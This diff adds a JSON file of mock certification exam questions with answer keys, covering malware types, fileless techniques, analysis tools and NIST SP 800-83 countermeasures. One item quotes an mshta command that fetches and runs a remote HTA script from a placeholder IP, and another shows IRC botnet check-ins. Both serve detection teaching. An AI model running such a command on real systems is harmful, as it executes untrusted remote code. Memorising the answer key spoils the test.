@@ -1,0 +1,749 @@
+[
+  {
+    "id": "m07-q-0083",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "An e-mail attachment, once opened, sends a copy of itself to every address in the victim's contacts. It does not modify any other file on the computer. Which type of malware is this?",
+    "options": ["Mass-mailing worm", "File infector virus", "Rootkit", "Logic bomb"],
+    "answer": 0,
+    "explanation": "SP 800-83: a mass-mailing worm is like an e-mail virus but self-contained; it does not infect existing files.",
+    "optionNotes": [
+      "Correct: self-contained and spreads itself by e-mail.",
+      "A file infector modifies other executables.",
+      "A rootkit hides; it does not mail itself.",
+      "A logic bomb waits for a condition."
+    ],
+    "tags": ["worm"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://csrc.nist.gov/glossary/term/worm"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0084",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What does a boot sector virus infect?",
+    "options": [
+      "The browser's cookie store",
+      "Only Office document templates",
+      "The master boot record or boot sector, so it loads before the operating system",
+      "The printer's firmware"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 lists boot sector viruses among compiled viruses; Secure Boot and boot integrity checks defend against boot-level malware.",
+    "optionNotes": [
+      "Cookies do not hold viruses.",
+      "That is a macro virus.",
+      "Correct: it runs during startup, before the OS is fully loaded.",
+      "Printer firmware is not a boot sector."
+    ],
+    "tags": ["virus-types"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://attack.mitre.org/techniques/T1542/003/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0085",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A modded game installer from a forum works as promised, but it also adds a hidden service that waits for connections and gives the attacker a remote shell. What BEST describes the hidden service?",
+    "options": ["A keylogger", "A mass-mailing worm", "A macro virus", "A backdoor (remote access Trojan)"],
+    "answer": 3,
+    "explanation": "The installer is the Trojan; the service it plants is the backdoor. SP 800-83 lists remote administration tools as a backdoor type.",
+    "optionNotes": [
+      "A keylogger records keystrokes; it does not offer a shell.",
+      "Nothing is being e-mailed.",
+      "No document macro is involved.",
+      "Correct: it listens for remote commands and gives the attacker control."
+    ],
+    "tags": ["backdoor", "rat", "trojan"],
+    "sources": ["https://csrc.nist.gov/glossary/term/backdoor", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0086",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "ec-council-term",
+    "difficulty": 2,
+    "stem": "Which malware component encrypts a program's code so that antivirus scanners cannot recognize it, decrypting it only at run time?",
+    "options": ["Downloader", "Crypter", "Exploit", "Wrapper"],
+    "answer": 1,
+    "explanation": "Crypters and packers both hide code from static signatures (ATT&CK T1027); crypters focus on encryption.",
+    "optionNotes": [
+      "A downloader fetches the payload.",
+      "Correct: its job is to hide the code from scanning.",
+      "An exploit abuses a vulnerability.",
+      "A wrapper joins two programs together."
+    ],
+    "tags": ["malware-components", "ec-council-specific"],
+    "sources": ["https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/", "https://attack.mitre.org/techniques/T1027/"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0087",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "One malware sample spreads by e-mail, exploits a vulnerable network service to reach more hosts, and also infects executable files on shared drives. How does NIST SP 800-83 classify it?",
+    "options": ["Logic bomb", "Mobile code", "Blended attack", "Attacker toolkit"],
+    "answer": 2,
+    "explanation": "SP 800-83 notes that most modern malware is blended, which is why one incident procedure now covers all malware types.",
+    "optionNotes": [
+      "No trigger condition is involved.",
+      "Mobile code runs from a remote host without explicit install; that is not the point here.",
+      "Correct: several infection or transmission methods in one.",
+      "A toolkit is a set of attacker utilities, not self-spreading malware."
+    ],
+    "tags": ["blended-attack"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0088",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What is spyware?",
+    "options": [
+      "Software that replicates across networks",
+      "Software that encrypts files and demands a ransom",
+      "Software that fills the screen with advertisements",
+      "Software secretly installed to gather information about people or organizations without their knowledge"
+    ],
+    "answer": 3,
+    "explanation": "Keyloggers, screen grabbers and browser monitors are common spyware functions.",
+    "optionNotes": ["That is a worm.", "That is ransomware.", "That is adware.", "Correct: covert information gathering."],
+    "tags": ["spyware"],
+    "sources": ["https://csrc.nist.gov/glossary/term/spyware", "https://attack.mitre.org/techniques/T1056/001/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0089",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "A firewall log shows 40 internal hosts each opening connections to `203.0.113.50:6667` and sending `JOIN #cmd` at regular intervals. What does this MOST likely show?",
+    "options": [
+      "Bots checking in with an IRC-based command-and-control server",
+      "Staff using an approved chat tool",
+      "A backup job sending data to the cloud",
+      "Normal DNS resolution"
+    ],
+    "answer": 0,
+    "explanation": "SP 800-83 gives IRC as an example of a botnet C2 channel; containment can block that service at the perimeter.",
+    "optionNotes": [
+      "Correct: many hosts joining the same IRC channel on a schedule is classic botnet C2.",
+      "An approved tool would not be joining a channel called cmd on a raw IP.",
+      "Backups do not send IRC commands.",
+      "DNS uses port 53, not IRC."
+    ],
+    "tags": ["botnet", "c2", "command-output"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://attack.mitre.org/tactics/TA0011/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0090",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "NIST SP 800-83 says attacker tools such as keyloggers and rootkits are not strictly malware. Why?",
+    "options": [
+      "They are always legal to use",
+      "They have no infection capability of their own and rely on malware or other attacks to be installed",
+      "They only run on servers",
+      "They never cause any damage"
+    ],
+    "answer": 1,
+    "explanation": "Because they are delivered by malware and removed with the same tools, SP 800-83 still covers them.",
+    "optionNotes": [
+      "Legality depends on authorization, not on the tool category.",
+      "Correct: something else has to put them on the host.",
+      "They run on desktops and laptops too.",
+      "They cause serious harm once installed."
+    ],
+    "tags": ["attacker-tools"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0091",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "Incident responders find no suspicious executables, but a WMI event filter and consumer run an encoded PowerShell command every time a user logs on. What technique is this?",
+    "options": ["Persistence through a WMI event subscription", "A boot sector infection", "A macro virus in a template", "A DNS tunnel"],
+    "answer": 0,
+    "explanation": "WMI event subscriptions let code run on events without a dropped file, which is why responders review them alongside Run keys and tasks.",
+    "optionNotes": [
+      "Correct: ATT&CK T1546.003, a fileless persistence method.",
+      "Nothing touches the boot sector.",
+      "No document template is involved.",
+      "No DNS traffic is described."
+    ],
+    "tags": ["fileless", "persistence"],
+    "sources": ["https://attack.mitre.org/techniques/T1546/003/", "https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0092",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "In Microsoft's classification, what is a Type III fileless threat?",
+    "options": [
+      "One that never touches any file, such as a network exploit loading code into memory",
+      "One that needs files to operate but runs its payload through native tools, such as a registry handler launching a script via mshta",
+      "One stored only in the WMI repository",
+      "One that infects only firmware"
+    ],
+    "answer": 1,
+    "explanation": "Type I: no file activity. Type II: indirect file activity. Type III: files required to operate.",
+    "optionNotes": [
+      "That is Type I.",
+      "Correct: files are required, but the payload stays out of ordinary executables.",
+      "That is a Type II example.",
+      "Firmware threats are a separate category."
+    ],
+    "tags": ["fileless"],
+    "sources": ["https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats", "https://attack.mitre.org/techniques/T1218/005/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0093",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "EDR shows `outlook.exe` starting `mshta.exe http://198.51.100.7/p.hta`. What is the attacker MOST likely doing?",
+    "options": [
+      "Scanning the network for SMB",
+      "Updating Outlook through the official channel",
+      "Opening a calendar invitation",
+      "Using a trusted Windows binary to run remote script code (living off the land)"
+    ],
+    "answer": 3,
+    "explanation": "System binary proxy execution hides malicious script behind signed Windows programs; parent-child process monitoring reveals it.",
+    "optionNotes": [
+      "Nothing here scans the network.",
+      "Outlook updates do not run HTA files from a raw IP.",
+      "Calendar invitations do not start mshta.",
+      "Correct: mshta is a signed LOLBin that can run HTA script from a URL (ATT&CK T1218.005)."
+    ],
+    "tags": ["lotl", "command-output"],
+    "sources": ["https://attack.mitre.org/techniques/T1218/005/", "https://lolbas-project.github.io/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0094",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Why do attackers like to use built-in Windows binaries such as rundll32, certutil and mshta?",
+    "options": [
+      "They are faster than any custom malware",
+      "They cannot be logged by Windows",
+      "They are signed and trusted, so their activity blends in with normal administration",
+      "They automatically disable antivirus"
+    ],
+    "answer": 2,
+    "explanation": "CISA's LOTL guidance stresses behavior baselines and detailed logging, because these tools are also used legitimately.",
+    "optionNotes": [
+      "Speed is not the reason.",
+      "Their use can be logged (Sysmon, EDR, command-line auditing).",
+      "Correct: trusted tools draw less attention and avoid dropping new files.",
+      "They do not disable antivirus by themselves."
+    ],
+    "tags": ["lotl", "fileless"],
+    "sources": [
+      "https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques",
+      "https://attack.mitre.org/techniques/T1218/011/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0095",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "Reverse engineers find an API key for a public LLM service inside a VBScript sample, plus a prompt asking for an obfuscated version of the script. What is the author MOST likely trying to achieve?",
+    "options": [
+      "Better printing of the ransom note",
+      "Faster encryption of the victim's files",
+      "New, different-looking copies of the malware to evade signature detection",
+      "A lower CPU load on the victim"
+    ],
+    "answer": 2,
+    "explanation": "Google described this pattern in 2025. Defenders can also block and alert on unapproved AI API traffic from endpoints.",
+    "optionNotes": [
+      "Nothing relates to ransom notes.",
+      "The prompt asks for obfuscation, not encryption speed.",
+      "Correct: runtime LLM rewriting produces variants that hashes and signatures miss.",
+      "CPU load is not the goal."
+    ],
+    "tags": ["ai", "v13-new", "evasion"],
+    "sources": [
+      "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools",
+      "https://attack.mitre.org/techniques/T1027/"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0096",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "A malware team wants to use AI to speed up triage of hundreds of suspicious scripts. Which use is the MOST appropriate?",
+    "options": [
+      "Let the LLM delete any file it considers malicious without review",
+      "Use an LLM to summarize each script, then have an analyst confirm the findings with evidence",
+      "Upload confidential company documents to a public chatbot for scanning",
+      "Replace all antivirus engines with the chatbot"
+    ],
+    "answer": 1,
+    "explanation": "AI-powered analysis tools (such as code explanation features) are helpers. Output must be verified and data handling rules still apply.",
+    "optionNotes": [
+      "Unreviewed automated deletion can destroy evidence and legitimate files.",
+      "Correct: AI speeds up triage; people confirm.",
+      "That leaks confidential data.",
+      "A chatbot is not a replacement for layered detection."
+    ],
+    "tags": ["ai", "v13-new", "soc"],
+    "sources": ["https://blog.virustotal.com/2023/04/introducing-virustotal-code-insight.html", "https://genai.owasp.org/llm-top-10/"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0097",
+    "module": 7,
+    "section": "AI-based Malware Concepts",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "Why should a company that relies on a machine learning malware detector still keep other detection layers?",
+    "options": [
+      "Attackers can craft inputs that make the model misclassify malware as benign",
+      "Machine learning models cannot scan executable files",
+      "ML detectors only work offline",
+      "ML detectors are illegal in some countries"
+    ],
+    "answer": 0,
+    "explanation": "NIST AI 100-2 describes evasion and poisoning attacks; defense in depth covers the moment one model is fooled.",
+    "optionNotes": [
+      "Correct: adversarial evasion is a known weakness of ML classifiers.",
+      "ML detectors do score executables.",
+      "Many ML detectors run in the cloud.",
+      "Legality is not the issue."
+    ],
+    "tags": ["ai", "v13-new", "adversarial-ml"],
+    "sources": [
+      "https://csrc.nist.gov/pubs/ai/100/2/e2025/final",
+      "https://learn.microsoft.com/en-us/defender-endpoint/cloud-protection-microsoft-defender-antivirus"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0098",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "A PE file's import table lists `VirtualAllocEx`, `WriteProcessMemory` and `CreateRemoteThread`. What capability does this MOST likely suggest?",
+    "options": ["Compressing files for backup", "Printing documents", "Playing audio", "Injecting code into another process"],
+    "answer": 3,
+    "explanation": "Reading imports is static analysis: these three APIs together are a classic process injection pattern (ATT&CK T1055).",
+    "optionNotes": [
+      "Compression does not need access to other processes.",
+      "Printing uses different APIs.",
+      "Audio uses multimedia APIs.",
+      "Correct: allocate memory in another process, write to it, start a thread there."
+    ],
+    "tags": ["static-analysis", "process-injection"],
+    "sources": ["https://learn.microsoft.com/en-us/windows/win32/debug/pe-format", "https://attack.mitre.org/techniques/T1055/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0099",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "Which free Linux distribution bundles hundreds of tools for reverse engineering and analyzing malware?",
+    "options": ["pfSense", "Kali Purple", "Ubuntu Server", "REMnux"],
+    "answer": 3,
+    "explanation": "REMnux (Linux) and FLARE-VM (Windows) give analysts a ready-made lab toolset.",
+    "optionNotes": [
+      "pfSense is a firewall distribution.",
+      "Kali Purple targets defensive security operations in general.",
+      "Ubuntu Server is a general-purpose OS.",
+      "Correct: a Linux toolkit built for malware analysis."
+    ],
+    "tags": ["malware-lab", "tools"],
+    "sources": ["https://docs.remnux.org/", "https://github.com/mandiant/flare-vm"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0100",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "tool",
+    "difficulty": 1,
+    "stem": "During dynamic analysis, which tool captures the DNS and HTTP traffic that the sample produces?",
+    "options": ["Strings", "Autoruns", "Wireshark", "AIDE"],
+    "answer": 2,
+    "explanation": "Captured traffic reveals C2 addresses, protocols and exfiltration attempts, and gives network indicators.",
+    "optionNotes": [
+      "Strings reads text from files.",
+      "Autoruns lists autostart entries.",
+      "Correct: a packet capture and protocol analyzer.",
+      "AIDE checks file integrity."
+    ],
+    "tags": ["dynamic-analysis", "tools"],
+    "sources": ["https://www.wireshark.org/docs/", "https://www.inetsim.org/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0101",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "`Get-FileHash .\\a.exe -Algorithm SHA256` returns the same value listed in a CISA advisory for a known ransomware loader. What can the analyst conclude?",
+    "options": [
+      "The file is a different variant of the same family",
+      "The file is identical to the sample described in the advisory",
+      "The file is safe because it is already known",
+      "The advisory's hash must be wrong"
+    ],
+    "answer": 1,
+    "explanation": "Exact hashes identify one specific file; similar variants need fuzzy hashes, imports or YARA rules.",
+    "optionNotes": [
+      "A different variant would have a different hash.",
+      "Correct: matching SHA-256 values mean the same file.",
+      "Known malware is still malware.",
+      "A match confirms the advisory, it does not disprove it."
+    ],
+    "tags": ["hashing", "command-output"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash",
+      "https://csrc.nist.gov/pubs/fips/180-4/upd1/final"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0102",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "Which tool writes process creations with the full command line, network connections and registry changes to the Windows event log for later analysis?",
+    "options": ["Sysmon", "UPX", "Detect It Easy", "Ghidra"],
+    "answer": 0,
+    "explanation": "Sysmon adds rich, SIEM-friendly telemetry to Windows and is used in both labs and production monitoring.",
+    "optionNotes": [
+      "Correct: event ID 1 is process creation, 3 network, 13 registry value set.",
+      "UPX packs executables.",
+      "Detect It Easy identifies file types and packers.",
+      "Ghidra is a reverse engineering framework."
+    ],
+    "tags": ["sysmon", "dynamic-analysis"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
+      "https://learn.microsoft.com/en-us/defender-endpoint/overview-endpoint-detection-response"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0103",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "An analyst wants to step through a sample's unpacking routine instruction by instruction while it runs, watching registers and memory. Which tool fits?",
+    "options": ["ssdeep", "TCPView", "x64dbg", "VirusTotal"],
+    "answer": 2,
+    "explanation": "Debuggers let analysts pause packed malware once it has decoded itself in memory, then dump the real code.",
+    "optionNotes": [
+      "ssdeep computes fuzzy hashes.",
+      "TCPView lists network endpoints.",
+      "Correct: a Windows debugger for x64 and x32 code.",
+      "VirusTotal aggregates scanner results."
+    ],
+    "tags": ["reverse-engineering", "tools"],
+    "sources": ["https://x64dbg.com/", "https://attack.mitre.org/techniques/T1027/002/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0104",
+    "module": 7,
+    "section": "Malware Analysis",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "How does NIST SP 800-150 define an indicator?",
+    "options": [
+      "A technical artifact or observable that suggests an attack is imminent or under way, or that a compromise has occurred",
+      "A score that ranks vulnerabilities by severity",
+      "A report written after an incident is closed",
+      "A firewall rule that blocks traffic"
+    ],
+    "answer": 0,
+    "explanation": "Indicators extracted from analysis feed detection tools and are shared in formats such as STIX.",
+    "optionNotes": [
+      "Correct: hashes, IPs, domains, registry keys and similar artifacts.",
+      "That is CVSS.",
+      "That is a lessons-learned report.",
+      "A block rule may use indicators but is not one."
+    ],
+    "tags": ["ioc"],
+    "sources": [
+      "https://csrc.nist.gov/glossary/term/indicator",
+      "https://csrc.nist.gov/pubs/sp/800/150/final",
+      "https://oasis-open.github.io/cti-documentation/stix/intro"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0105",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "Malware has hit 300 workstations built from one standard image. Finding every change it made on each host would take weeks. What does NIST SP 800-83 suggest?",
+    "options": [
+      "Analyze each host by hand until every change is found",
+      "Rebuild the hosts from the standard image and restore data from known good backups",
+      "Leave the hosts running and monitor them",
+      "Only delete the malware's executable"
+    ],
+    "answer": 1,
+    "explanation": "SP 800-83 points out that in managed environments with standard images, rebuilding can be quicker than working out exactly what the malware did.",
+    "optionNotes": [
+      "SP 800-83 notes this can take far longer than rebuilding.",
+      "Correct: rebuilding is often faster and more reliable than full analysis.",
+      "Leaving infected hosts running risks further damage.",
+      "Other changes may remain after the executable is gone."
+    ],
+    "tags": ["eradication", "recovery"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0106",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "Which virus detection method runs a suspicious program's code in a virtual CPU so that encrypted or polymorphic code reveals itself?",
+    "options": ["Signature scanning", "Integrity checking", "Interception", "Code emulation"],
+    "answer": 3,
+    "explanation": "Emulation is how scanners see through polymorphic wrappers without running the code on the real system.",
+    "optionNotes": [
+      "Signature scanning matches known patterns.",
+      "Integrity checking compares checksums.",
+      "Interception watches OS requests.",
+      "Correct: the emulator lets the code decrypt itself safely."
+    ],
+    "tags": ["virus-detection", "ec-council-specific"],
+    "sources": ["https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0107",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "An employee finds a USB drive in the car park and wants to plug it in to find its owner. What should company policy say?",
+    "options": [
+      "Format it on a work laptop and keep it",
+      "Plug it into any PC, since antivirus will catch problems",
+      "Plug it into a server because servers are better protected",
+      "Hand it to IT, which scans it on an isolated machine; AutoRun stays disabled on all PCs"
+    ],
+    "answer": 3,
+    "explanation": "Removable media is a known infection path (ATT&CK T1091); CISA advises caution with unknown USB drives.",
+    "optionNotes": [
+      "Plugging it in at all is the risk.",
+      "Some malware runs before or around antivirus checks.",
+      "Servers are higher-value targets.",
+      "Correct: isolated scanning plus disabled AutoRun blocks removable-media infection."
+    ],
+    "tags": ["removable-media"],
+    "sources": ["https://www.cisa.gov/news-events/news/using-caution-usb-drives", "https://attack.mitre.org/techniques/T1091/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0108",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "NIST SP 800-83 groups malware prevention into five main elements. Which list is correct?",
+    "options": [
+      "Identify, protect, detect, respond, recover",
+      "Policy, awareness, vulnerability mitigation, threat mitigation, defensive architecture",
+      "Preparation, detection, containment, eradication, recovery",
+      "Scanning, integrity checking, interception, emulation, heuristics"
+    ],
+    "answer": 1,
+    "explanation": "Defensive architecture covers sandboxing, browser separation and segregation through virtualization.",
+    "optionNotes": [
+      "These are Cybersecurity Framework functions.",
+      "Correct: the prevention elements of SP 800-83 Section 3.",
+      "These are incident response steps.",
+      "These are EC-Council's virus detection methods."
+    ],
+    "tags": ["prevention"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0109",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A company keeps suffering attacks that run PowerShell in memory and never drop a file, and its antivirus misses them. What should it add FIRST?",
+    "options": [
+      "Faster hard disks",
+      "A second signature-based antivirus",
+      "EDR with behavioral monitoring, plus PowerShell script block logging",
+      "A longer password expiry period"
+    ],
+    "answer": 2,
+    "explanation": "Behavior prevention on endpoint (ATT&CK M1040) and logging are the standard answers to fileless attacks.",
+    "optionNotes": [
+      "Disk speed is irrelevant.",
+      "Another signature engine has the same blind spot.",
+      "Correct: behavior and script telemetry catch what file signatures cannot.",
+      "Passwords do not detect in-memory code."
+    ],
+    "tags": ["fileless", "edr"],
+    "sources": [
+      "https://attack.mitre.org/mitigations/M1040/",
+      "https://learn.microsoft.com/en-us/defender-endpoint/overview-endpoint-detection-response",
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0110",
+    "module": 7,
+    "section": "Malware Countermeasures",
+    "domain": "D3",
+    "pool": "mock",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "During a malware outbreak, why can a custom network IPS signature help before antivirus vendors release theirs, according to SP 800-83?",
+    "options": [
+      "Administrators can write and deploy an IPS signature within hours, and it affects only the IPS sensors",
+      "IPS signatures also clean infected hosts",
+      "Antivirus products cannot use signatures",
+      "IPS devices never produce false positives"
+    ],
+    "answer": 0,
+    "explanation": "SP 800-83 recommends custom IPS signatures as an early containment step while vendor signatures are pending.",
+    "optionNotes": [
+      "Correct: faster to write and less risky to deploy than endpoint signatures.",
+      "An IPS blocks traffic; it does not disinfect hosts.",
+      "Antivirus relies heavily on signatures.",
+      "A poorly written IPS signature can block legitimate traffic."
+    ],
+    "tags": ["containment", "ips"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  }
+]
